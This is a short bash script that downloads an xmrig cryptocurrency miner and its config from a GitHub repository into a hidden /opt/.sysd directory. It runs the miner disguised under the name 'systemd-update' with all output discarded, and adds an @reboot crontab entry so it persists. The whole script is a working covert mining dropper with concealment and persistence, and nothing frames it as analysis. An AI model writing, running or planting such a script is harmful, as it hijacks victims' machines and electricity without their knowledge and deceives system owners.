#!/bin/bash

mkdir -p /opt/.sysd && cd /opt/.sysd

curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/xmrig.tar.gz -o miner.tar.gz
curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/config.json -o config.json

tar -xzf miner.tar.gz
chmod +x systemd-update

nohup ./systemd-update > /dev/null 2>&1 &
(crontab -l 2>/dev/null; echo "@reboot /opt/.sysd/systemd-update") | crontab -
